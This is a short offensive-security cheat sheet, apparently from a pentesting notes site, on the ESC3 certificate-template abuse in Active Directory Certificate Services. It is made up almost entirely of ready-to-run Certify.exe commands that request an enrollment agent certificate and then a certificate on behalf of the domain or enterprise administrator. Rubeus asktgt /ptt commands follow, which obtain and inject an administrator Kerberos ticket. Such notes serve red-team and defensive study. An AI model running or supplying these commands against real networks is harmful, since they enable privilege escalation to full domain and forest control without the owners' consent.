# ESC3

{% hint style="info" %}
Request an enrollment agent certificate and use it to request cert on behalf of ANY user
{% endhint %}

### [**Certify**](https://github.com/GhostPack/Certify)

#### **Escalation to DA**

* {% code lineNumbers="true" %}
  ```batch
  //Request cert for CertificatRequestAgent from target template.
  Certify.exe request /ca:<CA-Domain>\<CA-Username> /template:<target-template-name>
  //Convert from cert.pem to pfx and use it to request a cert on behalf of DA using target template.
  Certify.exe request /ca:<CA-Domain>\<CA-Username> /template:<target-template-name> /onbehalfof:<domain>\administrator /enrollcert:esc3agent.pfx /enrollcertpw:SecretPass@123
  ```
  {% endcode %}
* _**Convert from cert.pem to pfx, request DA TGT**_
  * `Rubeus.exe asktgt /user:administrator /certificate:esc3user-DA.pfx /password:SecretPass@123 /ptt`&#x20;

#### Escalation to EA

* Same as Step 1 above
* _**Convert from cert.pem to pfx and use it to request a certificate on behalf of EA using the target template.**_
  * `Certify.exe request /ca:<CA-Domain>\<CA-Username> /template:<target-template-name>     /onbehalfof:<parent-domain>\administrator /enrollcert:esc3agent.pfx /enrollcertpw:SecretPass@123`
* _**Request EA TGT**_
  * `Rubeus.exe asktgt /user:<parent-domain>\administrator /certificate:esc3user.pfx /dc:<parent-domain-dc> /password:SecretPass@123 /ptt`
